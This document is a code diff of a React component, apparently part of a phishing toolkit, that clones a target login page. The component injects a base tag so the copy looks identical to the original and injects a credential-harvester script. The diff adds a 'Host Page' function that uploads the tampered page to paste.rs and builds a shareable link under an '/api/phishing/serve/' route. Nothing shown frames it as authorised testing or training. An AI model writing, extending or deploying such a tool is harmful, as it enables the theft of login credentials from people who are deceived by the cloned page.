@@ -83,13 +83,14 @@ const getHarvesterScript = (redirectUrl: string) => `
 `;
 
 type LoginPageClonerProps = {
-  onHostPage: (htmlContent: string) => void;
+  onHostPage: (url: string) => void;
 };
 
 export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
   const { toast } = useToast();
   const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
   const [isProcessing, setIsProcessing] = useState(false);
+  const [isHosting, setIsHosting] = useState(false);
 
   const form = useForm<z.infer<typeof clonerSchema>>({
     resolver: zodResolver(clonerSchema),
@@ -103,6 +104,7 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
   const resetState = () => {
       setModifiedHtml(null);
       setIsProcessing(false);
+      setIsHosting(false);
   }
 
   const onSubmit = async (values: z.infer<typeof clonerSchema>) => {
@@ -117,17 +119,12 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
             toast({ title: "Cloning Page...", description: "Fetching HTML content from the URL." });
             const response = await clonePageFromUrl({ url: values.urlToClone });
             originalHtml = response.htmlContent;
-            // Set the value in the form so it's visible in the textarea
             form.setValue('htmlContent', originalHtml);
         } else if (originalHtml) {
-            // If user pasted HTML, we need a base URL for relative paths.
-            // We can try to guess it from an action attribute or default to the redirect URL's origin.
             const actionMatch = originalHtml.match(/action="([^"]+)"/);
-            if (actionMatch && actionMatch[1].startsWith('http')) {
-                baseHrefUrl = new URL(actionMatch[1]).origin;
-            } else {
-                baseHrefUrl = new URL(values.redirectUrl).origin;
-            }
+            baseHrefUrl = (actionMatch && actionMatch[1].startsWith('http'))
+                ? new URL(actionMatch[1]).origin
+                : new URL(values.redirectUrl).origin;
         }
 
         if (!originalHtml) {
@@ -137,23 +134,15 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
         let html = originalHtml;
         const harvesterScript = getHarvesterScript(values.redirectUrl);
           
-        // CRUCIAL STEP: Inject a <base> tag to fix relative links (CSS, JS, images).
-        // This makes the cloned page look identical to the original.
         if (baseHrefUrl) {
-             if (html.includes('<head>')) {
-                html = html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`);
-            } else {
-                html = `<head><base href="${baseHrefUrl}"></head>${html}`;
-            }
+             html = html.includes('<head>') 
+                ? html.replace(/<head>/i, `<head>\\n<base href="${baseHrefUrl}">`) 
+                : `<head><base href="${baseHrefUrl}"></head>${html}`;
         }
 
-        // Inject the harvester script just before the closing body tag.
-        if (html.includes('</body>')) {
-            html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
-        } else {
-            // If no body tag, just append it.
-            html += harvesterScript;
-        }
+        html = html.includes('</body>') 
+            ? html.replace(/<\/body>/i, `${harvesterScript}</body>`)
+            : html + harvesterScript;
 
         setModifiedHtml(html);
         toast({ title: "HTML Prepared", description: "Credential harvester has been injected." });
@@ -164,6 +153,37 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
     } finally {
         setIsProcessing(false);
     }
+  };
+
+  const handleHostPage = async () => {
+      if (!modifiedHtml) return;
+      setIsHosting(true);
+      toast({ title: "Hosting Page...", description: "Uploading content to secure host." });
+
+      try {
+          const pasteResponse = await fetch('https://paste.rs', {
+              method: 'POST',
+              body: modifiedHtml,
+              headers: { 'Content-Type': 'text/html' }
+          });
+          
+          if (!pasteResponse.ok) {
+              throw new Error(`Failed to host page. Service responded with status: ${pasteResponse.status}`);
+          }
+          
+          const pasteId = await pasteResponse.text();
+          const hostedUrl = `${window.location.origin}/api/phishing/serve/${pasteId}`;
+          
+          onHostPage(hostedUrl);
+          
+          toast({ title: "Page Hosted Successfully!", description: "Link is ready to be shared." });
+
+      } catch (e) {
+          const error = e instanceof Error ? e.message : "An unknown error occurred";
+          toast({ variant: 'destructive', title: "Hosting Failed", description: error });
+      } finally {
+          setIsHosting(false);
+      }
   };
 
   const handleCopyHtml = () => {
@@ -192,7 +212,7 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
                                 <FormItem> 
                                 <FormLabel>Target Page URL</FormLabel>
                                 <FormControl>
-                                    <Input placeholder="https://example.com/login" {...field} />
+                                    <Input placeholder="https://example.com/login" {...field} value={field.value ?? ''}/>
                                 </FormControl>
                                 <FormMessage />
                                 </FormItem> 
@@ -203,7 +223,7 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
                                 <FormItem> 
                                 <FormLabel>HTML Source Code</FormLabel>
                                 <FormControl>
-                                    <Textarea placeholder="Paste page source here..." {...field} className="h-40 font-mono" />
+                                    <Textarea placeholder="Paste page source here..." {...field} value={field.value ?? ''} className="h-40 font-mono" />
                                 </FormControl>
                                 <FormMessage />
                                 </FormItem> 
@@ -225,8 +245,8 @@ export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
                 {modifiedHtml && (
                 <CardFooter className="flex-col gap-4">
                     <div className="w-full flex gap-2">
-                        <Button onClick={() => onHostPage(modifiedHtml)} disabled={isProcessing} className="w-full">
-                            <Globe className="mr-2 h-4 w-4" />
+                        <Button onClick={handleHostPage} disabled={isProcessing || isHosting} className="w-full">
+                            {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <Globe className="mr-2 h-4 w-4" />}
                             Host Page
                         </Button>
                          <Button variant="secondary" onClick={handleCopyHtml}>
